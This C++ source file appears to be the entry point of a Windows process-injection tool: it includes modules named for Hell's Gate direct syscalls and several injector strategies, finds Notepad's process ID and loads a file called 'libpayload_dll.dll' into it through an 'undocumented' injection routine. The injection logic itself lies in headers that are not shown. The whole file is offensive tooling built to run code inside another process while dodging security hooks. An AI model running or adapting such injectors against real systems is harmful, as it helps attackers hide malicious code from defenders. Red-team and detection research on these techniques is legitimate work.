#include <iostream>
#include <string>
#include <filesystem>
#include "HellsGate/HellsGate.h"
#include "InjectorStrategy/InjectorLoadLibrary/InjectorLoadLibraryDefault.h"
#include "InjectorStrategy/InjectorLoadLibrary/InjectorLoadLibraryUndocumented.h"
#include "InjectorStrategy/InjectorLoadLibrary/InjectorLoadLibrarySyscall.h"
#include "ProcUtils.h"



std::wstring getAbsolutePathOfFile(std::wstring relativeFileName){
    std::filesystem::path filePath =  std::filesystem::absolute(relativeFileName);
    return filePath.wstring();
}

int main() {

    const std::wstring dllPath = getAbsolutePathOfFile(L"libpayload_dll.dll");
    DWORD notepadPid = GetPidByName(L"Notepad.exe");

    std::wcout << L"Notepad PID: " << notepadPid<<std::endl;
    std::wcout << L"Dll full path: " << dllPath<<std::endl;

    InjectProcessUndocumented(notepadPid, dllPath);



    return 0;
}